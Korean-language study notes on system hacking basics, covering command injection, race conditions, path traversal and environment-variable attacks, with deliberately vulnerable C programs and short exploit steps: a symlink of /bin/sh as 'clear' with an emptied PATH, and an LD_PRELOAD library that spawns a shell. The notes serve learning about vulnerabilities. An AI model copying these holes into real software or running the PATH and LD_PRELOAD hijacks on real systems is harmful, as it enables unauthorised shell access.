# System Hacking Fundemental

## logical bugs

### logical bugs

코드에 오류는 없지만 논리적인 오류로 인해 정상적으로 작동하지 않는 경우

### 커멘드 인젝션

검증되지 않은 공격자의 입력을 쉘 커맨드/쿼리의 일부로 처리해 실행 흐름을 변경

명령어 바인딩
```bash
$ : 쉘 환경 변수
A && B : A 실행되면 B 실행
A || B : A 안되면 B 실행
A; B : A 하고 B 실행
```

```c
// gcc -o cmdi cmdi.c
#include <stdlib.h>
#include <stdio.h>
int main()
{
    char ip[36];
    char cmd[256] = "ping -c 2 "; 
	
    printf("Alive Checker\n");
    printf("IP: ");
    read(0, ip, sizeof(ip)-1);
    printf("IP Check: %s",ip);
    strcat(cmd, ip);
    system(cmd);
    return 0;
}
```

### Race Condition

프로세스 혹은 쓰레드 간 자원 관리 실수로 발생하는 상태

서로 다른 쓰레드에서 뮤텍스가 걸려있지 않아 공유 메모리에 접근하는 경우

쓰레드 간 공유 자원을 적절히 동기화하지 않았을 때

```c
// gcc -o race2 race2.c -fno-stack-protector -lpthread -m32
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int len;
void giveshell() {
    system("/bin/sh");
}
void * t_function() {
    int i = 0;
    while (i < 10000000) {
        len++;
        i++;
        sleep(1);
    }
}
int main() {
    char buf[4];
    int gogo;
    int idx;
    pthread_t p_thread;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    while (1) {
        printf("1. thread create\n");
        printf("2. read buffer\n");
        printf("> ");
        scanf("%d", &idx);
        switch (idx) {
        case 1:
            pthread_create( &p_thread, NULL, t_function, (void * ) NULL);
            break;
        case 2:
            printf("len: ");
            scanf("%d", &len);
            if(len > sizeof(buf)) {
                exit(0);
            }
            sleep(4);
            printf("Data: ");
            read(0, buf, len);
            printf("Len: %d\n", len);
            printf("buf: %s\n", buf);
            break;
        case 3:
            if (gogo == 0x41414141) {
                giveshell();
            }
        }
    }
    return 0;
}
```

> 뮤텍스 : 자원에 대한 접근을 동기화하기 위해 사용되는 상호배제 기술, Locking 메커니즘으로 하나의 쓰레드만이 동일한 시점에 뮤텍스를 얻어 임계영역에 접근, 해당 쓰레드만이 임계영역에서 나갈때 뮤텍스를 해제
> 세마포어 : 뮤텍스와 마찬가지의 기술, Signaling 메커니즘으로 락을 걸지 않은 다른 쓰레드도 Signal을 보내서 락을 해제할 수 있음
> 뮤텍스는 얻은 쓰레드가 직접 다 쓰고 나갈때 해제, 세마포어는 다른 쓰레드도 시그널을 보내서 해제 요청

### Path Traversal

프로그래머가 가정한 디렉토리를 벗어나 외부에 존재하는 파일에 접근할 수 있는 취약점

```c
_traversal.c
// gcc -o path_traversal path_traversal.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int main()
{
	char path[256] = "/tmp/";
	char file_buf[10240];
	char filename[256] = {0,};
	char cmd[256] = {0,};
	
	int len;
	FILE *fp;
	printf("Filename: ");
	fflush(stdout);
	len = read(0, filename, sizeof(filename)-1);
	filename[len-1] = '\0';
	strncat(path, filename, sizeof(path)-1);
	fp = fopen(path, "r");
	if(!fp) {
		return -1;
	}
	fread(file_buf, 1, sizeof(file_buf), fp);
	printf("%s\n", file_buf);
	fclose(fp);
	return 0;
}
```

### 환경변수 공격

환경변수에 등록된 경로를 활용

$ export
$ export PATH="..."

심볼릭 링크와 결합하면

```c
#include <stdlib.h>
#include <unistd.h>
int main()
{
    printf("Screen Cleaner\n");
    system("clear");
         
    return 0;
}
```

```bash
$ ln -s /bin/sh ./clear
$ export PATH=""
$ ./exploit
```

=> /bin/sh의 심볼릭 링크가 현재 디렉토리에 clear라는 이름으로 생성됨
=> 환경변수를 모두 지우고
=> 프로그램을 실행하면
=> clear 명령어가 현재 디렉토리 내에서 실행(원래 같으면 환경변수 등록이 되어있어 정상적인 clear 명령이 실행되었겠지만)
=> clear에 연결되어 있는 /bin/sh이 실행
=> 쉘 획득

> 심볼릭 링크 : 윈도우에서 바로가기(ln -s 원본 ./링크, rm 링크)

LD_PRELOAD 환경변수 : 로더가 프로세스에 로드할 라이브러리 파일을 저장 => 프로그램에서 특정 함수를 호출하면 해당 환경변수에 등록된 라이브러리 파일을 먼저 참조하여 호출된 함수를 찾음

LD_PRELOAD에 원하는 라이브러리 파일을 libc.so 이름으로 전달하면 해당 파일을 모든 파일 실행시 참조하게 됨

```c
// gcc -o libc.so libc.c -fPIC -shared
#include <stdlib.h>
void read() {
	execve("/bin/sh", 0, 0);
}
```

```bash
$ export LD_PRELOAD="./libc.so"
$ ./environ2
Data:# id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$ strace -if ./environ2
[00007ffff78d7777] execve("./environ2", ["./environ2"], [/* 20 vars */]) = 0
...
[00007ffff7df22a7] open("./libc.so", O_RDONLY|O_CLOEXEC) = 3
...
[00007ffff79022c0] write(1, "Data:", 5Data:) = 5
[00007ffff78d7777] execve("/bin/sh", NULL, NULL) = 0
...
```

=> 원래 있는 libc.so 파일이 아닌 새로 생성한 libc.so 파일을 참조하여 실행

> libc.so => /lib 내 존재, C 표준 라이브러리